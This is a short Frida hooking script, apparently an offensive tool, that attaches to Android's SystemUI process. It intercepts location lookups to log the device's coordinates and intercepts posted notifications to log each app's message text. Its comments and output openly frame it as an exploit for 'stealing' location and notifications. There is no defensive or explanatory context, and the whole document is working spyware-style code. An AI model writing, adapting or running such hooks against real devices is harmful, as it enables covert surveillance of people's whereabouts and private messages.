//frida -U -n com.android.systemui -l steal_info.js 

Java.perform(function () {
    console.log("[+] Hooking to steal Location & Notifications...");

    // --- Hooking LocationManager to steal location ---
    var LocationManager = Java.use("android.location.LocationManager");

    LocationManager.getLastKnownLocation.overload("java.lang.String").implementation = function (provider) {
        var location = this.getLastKnownLocation(provider);
        console.log("[+] Location: Lat=" + location.getLatitude() + ", Lon=" + location.getLongitude());
        return location;
    };

    // --- Hooking NotificationListenerService to steal notifications ---
    var NotificationListener = Java.use("android.service.notification.NotificationListenerService");

    NotificationListener.onNotificationPosted.implementation = function (statusBarNotification) {
        var pkg = statusBarNotification.getPackageName();
        var text = statusBarNotification.getNotification().extras.get("android.text");
        console.log("[+] Notification from: " + pkg + " -> " + text);
    };

    console.log("[+] Exploit Ready: Stealing location & notifications...");
});
